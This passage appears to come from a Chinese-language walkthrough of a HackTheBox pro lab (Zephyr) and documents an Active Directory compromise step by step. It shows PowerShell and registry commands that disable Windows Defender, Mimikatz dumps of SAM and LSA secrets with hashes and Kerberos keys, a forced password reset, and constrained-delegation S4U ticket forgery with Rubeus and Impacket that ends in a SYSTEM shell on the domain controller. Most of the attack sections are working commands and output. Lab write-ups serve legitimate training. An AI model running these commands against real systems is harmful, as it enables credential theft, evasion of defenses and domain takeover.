ZEPHYR{P3r5isT4nc3_1s_k3Y_4_M0v3men7}
```

## Smbexec
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q smbexec.py James@192.168.110.53 -hashes :8af1903d3c80d3552a84b6ba296db2ea
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>
```

## 关闭防护
```plain
powershell -ep bypass -nop -c "Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableBehaviorMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; Set-MpPreference -DisableScriptScanning $true"
```

```plain
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
```

```plain
Add-MpPreference -ExclusionPath "C:\Users\Public"
```

```plain
powershell -ep bypass -c "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\Users\Public'"
```

## Mimikatz
### upload
```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe mimikatz.exe
                                        
Info: Uploading /home/kali/Desktop/tools/mimikatz/x64/mimikatz.exe to C:\Users\Public\mimikatz.exe
                                        
Data: 1666740 bytes of 1666740 bytes copied
                                        
Info: Upload successful!
```

### lsadump::sam
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::sam
Domain : PNT-SVRBPA
SysKey : 796eebc028df9ad69c64f87d7886be77
Local SID : S-1-5-21-2952569584-3195625271-31431492

SAMKey : b6a83a5dc3d09ffaae2e3992535504ae

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 23ea5ff648e7ec7dcd1bfef8e9434099

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 7b1cedf73b1b448644acdf09f02c772f

* Primary:Kerberos-Newer-Keys *
    Default Salt : PNT-SVRBPA.PAINTERS.HTBAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 4e0ad47649eb170aa834c2d523c3dd251c82870d22b10289106788be469b8b1f
      aes128_hmac       (4096) : 7ce04dd700b73aae9b5d94315972200a
      des_cbc_md5       (4096) : 91166bf786c19b4f
    OldCredentials
      aes256_hmac       (4096) : 960d854d0cc119cec75cae1694ca559553669cd7dff0ee81a99359720b3fa3aa
      aes128_hmac       (4096) : 2db668cd0667aa83a084d83506827afe
      des_cbc_md5       (4096) : c176e91040f4208c
    OlderCredentials
      aes256_hmac       (4096) : c2dc69159b14db34fe2d4752332d4ef517266cb81fe459653e5fafc473ad4827
      aes128_hmac       (4096) : 2605c4299898c08c2dfe64eda90ec922
      des_cbc_md5       (4096) : 34b58ab091c75e08

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : PNT-SVRBPA.PAINTERS.HTBAdministrator
    Credentials
      des_cbc_md5       : 91166bf786c19b4f
    OldCredentials
      des_cbc_md5       : c176e91040f4208c


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount

RID  : 000003e9 (1001)
User : James
  Hash NTLM: 8af1903d3c80d3552a84b6ba296db2ea

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 034d74c9d3edc55187fb2928803838b7

* Primary:Kerberos-Newer-Keys *
    Default Salt : BYPASS.PAINTERS.HTBJames
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a14bd497f5306222ef53e2f2f0ff1a4dfbc2f306708a8420044f71d87a4025c6
      aes128_hmac       (4096) : bc0cec1f4d19c09edb9ac0a90a0fc321
      des_cbc_md5       (4096) : dc373e4cae61e5fb

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : BYPASS.PAINTERS.HTBJames
    Credentials
      des_cbc_md5       : dc373e4cae61e5fb


mimikatz(commandline) # exit
Bye!
```

### kerberos::list
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "kerberos::list" "exit"


  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # kerberos::list

[00000000] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 14:11:34 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : krbtgt/PAINTERS.HTB @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ; 

[00000001] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 13:30:25 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : krbtgt/PAINTERS.HTB @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ; 

[00000002] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 16:26:46 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : ldap/DC.painters.htb @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000003] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 16:13:43 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : cifs/DC.painters.htb @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000004] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 14:11:34 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : cifs/DC.painters.htb/painters.htb @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000005] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 14:11:34 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : LDAP/DC.painters.htb/painters.htb @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ; 

[00000006] - 0x00000012 - aes256_hmac      
   Start/End/MaxRenew: 20/03/2026 14:11:34 ; 20/03/2026 23:30:25 ; 27/03/2026 03:45:23
   Server Name       : PNT-SVRBPA$ @ PAINTERS.HTB
   Client Name       : pnt-svrbpa$ @ PAINTERS.HTB
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 

mimikatz(commandline) # exit
Bye!
```

### lsadump::secrets
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::secrets" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::secrets
Domain : PNT-SVRBPA
SysKey : 796eebc028df9ad69c64f87d7886be77

Local name : PNT-SVRBPA ( S-1-5-21-2952569584-3195625271-31431492 )
Domain name : PAINTERS ( S-1-5-21-1470357062-2280927533-300823338 )
Domain FQDN : painters.htb

Policy subsystem is : 1.18
LSA Key(s) : 1, default {d634d107-fa31-7205-0094-4cb197fe8688}
  [00] {d634d107-fa31-7205-0094-4cb197fe8688} 19a408cd3a159812c9f92e646aa184fa8d490469a628acc1d7b620c6495a261e

Secret  : $MACHINE.ACC
cur/hex : 5d 3c c8 7c f2 60 66 1f 1a 03 9b d4 08 f1 d6 ae d1 20 a0 07 39 2e 50 ed 63 68 7b a6 5d a1 bd 18 1d ac 3f 7a 80 05 0a b0 1f 75 50 23 1e 74 c3 22 7e 10 9f a1 ab 0e 6f d8 11 91 dc dd 7f f4 4d f3 ba 10 ec 0c cf 98 66 5f e5 86 58 51 ea 0c de d3 65 20 98 13 93 1e b3 f2 fe fd 39 ba 12 c9 e8 7a 83 cb a1 90 b6 37 a7 00 18 d7 49 d8 ec fc 60 c6 16 56 4d 5d 99 78 21 b1 9c 87 98 ac 9e 55 dd 9f 63 57 9f 96 60 18 ae 78 a1 c0 37 27 8e 17 cb 22 1a fd 2b 8e 8f 68 ac 46 74 b1 c9 93 8d 19 20 5d 0e de fd da 8d 7f c2 28 a1 15 d3 a8 4e c3 6e f3 e2 0c a6 9e d6 6b 98 68 a6 5a 5f 32 62 fd 21 d1 4c 8a 2f 02 79 fc f8 73 36 29 29 31 f0 fe 64 a2 f6 69 ce db 0b 3a 7b 03 62 a1 a9 1f e0 50 38 60 98 7d 37 bb a2 3c 92 47 97 80 c8 b0 8c 9b 97 fa 
    NTLM:2dfcebbe9f5f4cb3bf98032887b3d7b6
    SHA1:f32d8e7d51ed920b1ec936f2f9abdbd65ee25853
old/hex : 34 c8 ef d0 65 3e e7 18 4e c4 f7 10 32 50 3e 42 b8 4f 0a 2c 9c 02 07 30 8f b7 b3 b9 29 b8 7a af be 5c b1 5d 96 41 8c df c0 1e da 93 b9 40 a0 9c 2f 1f 46 03 ae 0e 14 ee e6 3e 59 2b 03 45 a2 05 a3 ee 8e 52 67 bc fd 47 8b 4d 52 b7 c7 97 5c cb 2c b6 2d 70 9a 8b b5 31 5b 37 bf 6f 19 e3 6d 5b cc 17 10 4a 65 a8 b7 47 ab 7f 56 c1 6b f4 b8 aa 07 2a ab 64 58 18 90 21 ef a1 f4 39 18 cb 98 4d 8f b4 4d ec 44 8d 7d 3e 25 94 99 64 56 27 94 93 4d 81 82 26 ba 2e 44 56 38 74 f5 a5 af 74 41 bf 35 7f 8c 38 ac 23 57 c4 50 e5 d8 93 ce 1b 92 95 4a 39 17 09 3a 1c 8b 7b a7 72 16 6f 61 86 cb 9d 0d 6f 9a 3c 3e 0f b0 72 ce 77 3f ef 45 8f bd e7 20 ca 98 c9 f0 63 2f d0 52 cf ab 16 0d 47 65 90 4a 19 87 ce 9e 08 1c 0c 5c 1a 6e 15 1a 5c 05 34 
    NTLM:0185a7c52f4c120b1d5b652a9392a0c2
    SHA1:f1601171fef9a5c6d8d6379fa50ba29e775dff8c

Secret  : DPAPI_SYSTEM
cur/hex : 01 00 00 00 ad 49 8b ea f7 01 b9 5a 8d d1 96 45 50 c6 31 55 f7 2f 7a 36 f8 46 da f7 0f 12 94 25 8b 24 a9 a5 86 ea fb f0 04 c5 cc 0b 
    full: ad498beaf701b95a8dd1964550c63155f72f7a36f846daf70f1294258b24a9a586eafbf004c5cc0b
    m/u : ad498beaf701b95a8dd1964550c63155f72f7a36 / f846daf70f1294258b24a9a586eafbf004c5cc0b
old/hex : 01 00 00 00 fe cd 1b 46 01 f1 f1 be cf 33 b3 89 ff a2 ef f5 d8 bc 8c d3 61 30 d2 e5 0c 7b 21 53 92 30 41 24 22 ed eb 00 71 25 30 77 
    full: fecd1b4601f1f1becf33b389ffa2eff5d8bc8cd36130d2e50c7b21539230412422edeb0071253077
    m/u : fecd1b4601f1f1becf33b389ffa2eff5d8bc8cd3 / 6130d2e50c7b21539230412422edeb0071253077

Secret  : NL$KM
cur/hex : 48 6d d8 24 3e d2 25 7b 96 58 d1 98 1b 7a e3 57 79 5b c9 17 d2 e7 e7 1a f9 48 b4 9f d8 6d 1e a8 f8 9b 47 1c b9 e3 b2 e1 ce fc 2c 92 48 01 39 25 a3 aa d4 45 a3 f4 a5 a8 4b 9b de 1f 86 a7 5b b7 
old/hex : 48 6d d8 24 3e d2 25 7b 96 58 d1 98 1b 7a e3 57 79 5b c9 17 d2 e7 e7 1a f9 48 b4 9f d8 6d 1e a8 f8 9b 47 1c b9 e3 b2 e1 ce fc 2c 92 48 01 39 25 a3 aa d4 45 a3 f4 a5 a8 4b 9b de 1f 86 a7 5b b7 

mimikatz(commandline) # exit
Bye!
```

### 凭据整理
#### 本地管理员 Hash
```plain
Administrator NTLM:
23ea5ff648e7ec7dcd1bfef8e9434099
```

---

#### 域用户 James
```plain
James NTLM:
8af1903d3c80d3552a84b6ba296db2ea
```

👉 ⚠️ 注意：

```plain
Default Salt : BYPASS.PAINTERS.HTBJames
```

---

#### 机器账户 Hash
```plain
PNT-SVRBPA$ NTLM:
2dfcebbe9f5f4cb3bf98032887b3d7b6
```

---

## 查看域信任
```plain
*Evil-WinRM* PS C:\Users\Public> nltest /domain_trusts
List of domain trusts:
    0: ZSM zsm.local (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )
    1: PAINTERS painters.htb (NT 5) (Forest Tree Root) (Primary Domain) (Native)
The command completed successfully
```

+ ✅ **双向信任（Inbound + Outbound）**
+ ✅ **Forest Trust（跨森林）**
+ ✅ **可传递（transitive）**

## 域信息收集
### net user /domain
```plain
C:\Windows\system32>net user /domain
The request will be processed at a domain controller for domain painters.htb.


User accounts for \\DC.painters.htb

-------------------------------------------------------------------------------
Administrator            blake                    daniel                   
gavin                    Guest                    krbtgt                   
Matt                     riley                    tom                      
web_svc                  
The command completed with one or more errors.
```

### nltest /dclist:zsm.local
```plain
C:\Windows\system32>nltest /dclist:zsm.local
Get list of DCs in domain 'zsm.local' from '\\ZPH-SVRDC01.zsm.local'.
    ZPH-SVRDC01.zsm.local [PDC]  [DS] Site: Default-First-Site-Name
The command completed successfully
```

### zsm.local IP扫描
#### 域控IP
```plain
*Evil-WinRM* PS C:\Users\Public> ping zsm.local

Pinging zsm.local [192.168.210.10] with 32 bytes of data:
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127
Reply from 192.168.210.10: bytes=32 time=1ms TTL=127
Reply from 192.168.210.10: bytes=32 time=1ms TTL=127
Reply from 192.168.210.10: bytes=32 time<1ms TTL=127

Ping statistics for 192.168.210.10:
    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 1ms, Average = 0ms
```

#### 域内扫描
```plain
riley@mail:/tmp$ for i in {1..255}; do (ping -c 1 192.168.210.$i | grep "bytes from" &);done
64 bytes from 192.168.210.1: icmp_seq=1 ttl=64 time=0.659 ms
64 bytes from 192.168.210.10: icmp_seq=1 ttl=127 time=0.598 ms
64 bytes from 192.168.210.12: icmp_seq=1 ttl=127 time=0.881 ms
64 bytes from 192.168.210.13: icmp_seq=1 ttl=63 time=0.691 ms
64 bytes from 192.168.210.16: icmp_seq=1 ttl=127 time=0.802 ms
```

#### rustscan
```plain
./rustscan -a 192.168.210.1,192.168.210.10,192.168.210.12,192.168.210.13,192.168.210.16
Open 192.168.210.1:53
Open 192.168.210.16:53
Open 192.168.210.10:53
Open 192.168.210.1:80
Open 192.168.210.12:80
Open 192.168.210.10:88
Open 192.168.210.16:88
Open 192.168.210.10:135
Open 192.168.210.12:135
Open 192.168.210.12:139
Open 192.168.210.16:135
Open 192.168.210.10:139
Open 192.168.210.16:139
Open 192.168.210.16:389
Open 192.168.210.10:389
Open 192.168.210.1:443
Open 192.168.210.13:443
Open 192.168.210.10:445
Open 192.168.210.12:445
Open 192.168.210.16:445
Open 192.168.210.10:464
Open 192.168.210.16:464
Open 192.168.210.10:636
Open 192.168.210.16:636
Open 192.168.210.10:3268
Open 192.168.210.10:3269
Open 192.168.210.16:3268
Open 192.168.210.16:3269
```

#### netexec
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/blood]
└─# proxychains -q nxc smb 192.168.210.1/24 -u James -H 8af1903d3c80d3552a84b6ba296db2ea 
SMB         192.168.210.15  445    ZPH-SVRSQL01     [*] Windows 10 / Server 2019 Build 17763 x64 (name:ZPH-SVRSQL01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.16  445    ZPH-SVRCDC01     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCDC01) (domain:internal.zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.14  445    ZPH-SVRADFS1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRADFS1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.10  445    ZPH-SVRDC01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRDC01) (domain:zsm.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRMGMT1) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.12  445    ZPH-SVRCA01      [*] Windows Server 2022 Build 20348 x64 (name:ZPH-SVRCA01) (domain:zsm.local) (signing:False) (SMBv1:None)
SMB         192.168.210.15  445    ZPH-SVRSQL01     [-] zsm.local\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.210.16  445    ZPH-SVRCDC01     [-] internal.zsm.local\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.210.14  445    ZPH-SVRADFS1     [-] zsm.local\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.210.10  445    ZPH-SVRDC01      [-] zsm.local\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.210.11  445    ZPH-SVRMGMT1     [-] zsm.local\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
SMB         192.168.210.12  445    ZPH-SVRCA01      [-] zsm.local\James:8af1903d3c80d3552a84b6ba296db2ea STATUS_LOGON_FAILURE
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## Bloodhound
![](/image/hackthebox-prolabs/Zephyr-8.png)

![](/image/hackthebox-prolabs/Zephyr-9.png)



![](/image/hackthebox-prolabs/Zephyr-10.png)

攻击链已经很清晰了PNT-SVRBPA->BLAKE->DC.PAINTERS.HTB

## ForceChangePassword
### Mimikatz修改密码
```plain
C:\Windows\system32>C:\Users\Public\mimikatz.exe "privilege::debug" "lsadump::setntlm /user:blake /password:Pass@123 /server:dc.painters.htb" "exit"

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # lsadump::setntlm /user:blake /password:Pass@123 /server:dc.painters.htb
NTLM         : c87a64622a487061ab81e51cc711a34b

Target server: dc.painters.htb
Target user  : blake
Domain name  : PAINTERS
Domain SID   : S-1-5-21-1470357062-2280927533-300823338
User RID     : 1107

>> Informations are in the target SAM!

mimikatz(commandline) # exit
Bye!
```

### Netexec验证
```plain
┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/zephyr/blood]
└─# proxychains -q netexec smb 192.168.110.52 -u blake -p Pass@123
SMB         192.168.110.52  445    PNT-SVRSVC       [*] Windows Server 2022 Build 20348 x64 (name:PNT-SVRSVC) (domain:painters.htb) (signing:False) (SMBv1:None)
SMB         192.168.110.52  445    PNT-SVRSVC       [+] painters.htb\blake:Pass@123
```

## 约束委派
### upload rubeus
```plain
*Evil-WinRM* PS C:\Users\Public> upload /home/kali/Desktop/tools/Rubeus-1.6.4/Rubeus.exe Rubeus.exe
                                        
Info: Uploading /home/kali/Desktop/tools/Rubeus-1.6.4/Rubeus.exe to C:\Users\Public\Rubeus.exe                              
                                        
Data: 370004 bytes of 370004 bytes copied
                                        
Info: Upload successful!
```

### 委派原理
#### 核心概念
+ `**AllowedToDelegate**` 一般指受限委派，常见属性是 `**msDS-AllowedToDelegateTo**`
+ 它不是“这个账号自动就是管理员”，而是“这个账号对应的服务，被允许代表别人去访问特定 SPN”
+ 典型场景：前端 Web 服务器收到用户登录后，需要替用户去访问后端数据库/文件服务

#### Kerberos 里发生了什么
+ 用户先向 KDC 申请自己的票据
+ 用户访问前端服务，比如某台服务器上的 HTTP/CIFS 服务
+ 如果这个前端服务账号具备委派能力，它可以向 KDC 申请“代表该用户”的后端服务票据
+ 然后前端服务拿这个后端票据，去访问被允许的目标 SPN

#### 两种常见委派
+ 非约束委派：风险更大，服务能拿到用户的可转发 TGT，历史上很危险
+ 受限委派：只能委派到 `**msDS-AllowedToDelegateTo**` 里列出的 SPN，范围小一些
+ 基于资源的受限委派 RBCD：不是“我能委派到谁”，而是“目标主机允许谁代表别人访问我”

#### S4U 是什么
这是 Kerberos 里的“服务代用户”扩展。

+ `**S4U2Self**`：服务先为“某个用户”申请一张到“自己”的服务票据
    - 意思像是：“我是这个服务，我想获得一张显示 Alice 来访问我的票据”
+ `**S4U2Proxy**`：服务再拿着上一步的结果，去申请“代表 Alice 访问后端服务”的票据
    - 前提是它被允许委派到那个目标 SPN

所以常见链条是：

+ 先 `**S4U2Self**`
+ 再 `**S4U2Proxy**`
+ 最终得到“某高权限用户 -> 某目标服务”的服务票据

#### 为什么会危险
危险点不在“委派”三个字本身，而在这几个条件叠加：

+ 服务账号被配置了委派
+ 它能委派到敏感服务，比如 DC 上的 `**CIFS**`、`**HOST**`、`**LDAP**`
+ 能伪装成高权限用户，比如 Domain Admin
+ 目标服务一旦接受该票据，就会按高权限用户身份执行访问控制

于是效果就变成：

+ 不是你自己变成域管
+ 而是你拿到了一张“域管访问某服务”的合法 Kerberos 服务票据
+ 如果那个服务足够敏感，结果就等价于高权限访问

#### 为什么不是所有 `AllowedToDelegate` 都能打到 DC
因为它受限制：

+ 只能去属性里指定的 SPN
+ 不同 SPN 权限差异很大
+ 有些用户账号是“敏感账号，不可委派”
+ 某些保护机制会阻止票据被转发或限制协议转换
+ 服务跑在哪个账号下也很关键

所以看到某账号能 delegate，不代表一定能直接拿域控。

#### 和 `TrustedToAuthForDelegation` 的关系
常见还会看到一个关键位：

+ `**TRUSTED_TO_AUTH_FOR_DELEGATION**`

它通常表示这个账号支持协议转换，也就是能走更强的 S4U 流程。  
很多实战里，大家会一起看：

+ 有没有 `**msDS-AllowedToDelegateTo**`
+ 有没有 `**TrustedToAuthForDelegation**`
+ 允许委派到哪些 SPN

#### 高危目标为什么常见是 DC 的这些 SPN
因为域控承载很多关键服务：

+ `**LDAP**`：目录查询与很多域操作相关
+ `**CIFS**`：文件共享、远程管理场景常用
+ `**HOST**`：覆盖较广，很多系统服务依赖
+ `**RPC**`/其他管理相关 SPN：可能触发更强能力

如果受限委派指向这些 SPN，风险就明显升高。

### 方法一:靶机Rubeus(失败)
> 失败原因：AV防护，Rubeus无回显
>

#### 确认委派的具体 SPN
```plain
# 查看 blake 的 msDS-AllowedToDelegateTo 属性
powershell -ep bypass -c "Get-ADUser blake -Properties msDS-AllowedToDelegateTo | Select-Object -ExpandProperty msDS-AllowedToDelegateTo"

如果 Get-ADUser 不可用，用 LDAP 查询：
powershell -ep bypass -c "([adsisearcher]'(samaccountname=blake)').FindOne().Properties['msds-allowedtodelegateto']"
```

```plain
C:\Windows\system32>powershell -ep bypass -c "([adsisearcher]'(samaccountname=blake)').FindOne().Properties['msds-allowedtodelegateto']"
CIFS/dc.painters.htb
CIFS/DC
```

#### Rubeus 执行 S4U 攻击
```plain
# 一条命令完成：请求 TGT + S4U2self + S4U2proxy，冒充 Administrator
C:\Users\Public\Rubeus.exe s4u /user:blake /password:Pass@123 /domain:painters.htb /dc:DC.painters.htb /impersonateuser:Administrator /msdsspn:CIFS/DC.painters.htb /altservice:cifs,ldap,host,http /ptt

  关键参数说明：
  - /user:blake — 有委派权限的账户
  - /impersonateuser:Administrator — 要冒充的高权限用户
  - /msdsspn:http/DC.painters.htb — blake 被允许委派到的 SPN(上一步查出来的)
  - /altservice:cifs,ldap,host,http — 利用 SPN 中 service name 部分可替换的特性，同时请求多个服务的票据
  - /ptt — Pass the Ticket，自动注入到当前会话
```

#### 验证并访问 DC
```plain
 # 查看注入的票据
  klist

# 访问 DC 的文件系统（需要 cifs 票据）
  dir \\DC.painters.htb\C$

# 或读取 flag
  type \\DC.painters.htb\C$\Users\Administrator\Desktop\flag.txt
```

#### 如果 /ptt 在 Evil-WinRM 中不生效
```plain
Evil-WinRM 的网络登录会话可能不保留注入的票据。改为导出 .kirbi 文件再用其他方式利用：

# 不用 /ptt，而是保存票据
C:\Users\Public\Rubeus.exe s4u /user:blake /password:Pass@123 /domain:painters.htb /dc:DC.painters.htb /impersonateuser:Administrator /msdsspn:cifs/DC.painters.htb /altservice:ldap /nowrap

然后把输出的 base64 票据复制回 Kali，用 impacket 使用：

# 在 Kali 上：将 base64 票据转为 ccache
echo '<base64_ticket>' | base64 -d > admin.kirbi
impacket-ticketConverter admin.kirbi admin.ccache

# 使用票据
export KRB5CCNAME=admin.ccache
proxychains -q impacket-psexec -k -no-pass painters.htb/Administrator@DC.painters.htb
```

### 方法二:Kali-Impacket
> 绕过所有 AV
>

#### impacket-getST
```plain
# 1. 用 getST 执行 S4U2self + S4U2proxy，获取 Administrator 到 DC 的 CIFS 票据 
#    用 -altservice 请求 HOST 票据，再用 wmiexec

proxychains -q impacket-getST -spn 'CIFS/DC.painters.htb' -impersonate Administrator \
    -dc-ip 192.168.110.55 -altservice 'HOST/DC.painters.htb' \
    'painters.htb/blake:Pass@123'
    
# 2. 使用生成的票据
export KRB5CCNAME='Administrator@CIFS_DC.painters.htb@PAINTERS.HTB.ccache'

# 3. /etc/hosts 
echo "192.168.110.55 DC.painters.htb dc.painters.htb" >> /etc/hosts
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-getST -spn 'CIFS/DC.painters.htb' -impersonate Administrator -dc-ip 192.168.110.55 'painters.htb/blake:Pass@123'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@CIFS_DC.painters.htb@PAINTERS.HTB.ccache
                                                              
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# export KRB5CCNAME=Administrator@CIFS_DC.painters.htb@PAINTERS.HTB.ccache  
                                                              
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# echo "192.168.110.55 DC.painters.htb dc.painters.htb" >> /etc/hosts
```

#### smbexec
```plain
proxychains -q impacket-smbexec -k -no-pass -target-ip 192.168.110.55 'painters.htb/Administrator@DC.painters.htb'
```

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-smbexec -k -no-pass -target-ip 192.168.110.55 'painters.htb/Administrator@DC.painters.htb'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

# DC.painters.htb-192.168.110.55
> 如果约束委派后没办法直接横向到域控，可以使用secretsdump读取hash然后进行横向
>
> 然后进行atexec或者evil-winrm登录，或者使用smbclient读取flag
>

## smbexec
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-smbexec -k -no-pass -target-ip 192.168.110.55 'painters.htb/Administrator@DC.painters.htb'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

## wmiexec
```plain
┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# export KRB5CCNAME=Administrator@CIFS_DC.painters.htb@PAINTERS.HTB.ccache

┌──(web)─(root㉿kali)-[~kali/Desktop/htb/zephyr]
└─# proxychains -q impacket-wmiexec -k -no-pass painters.htb/Administrator@DC.painters.htb       
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
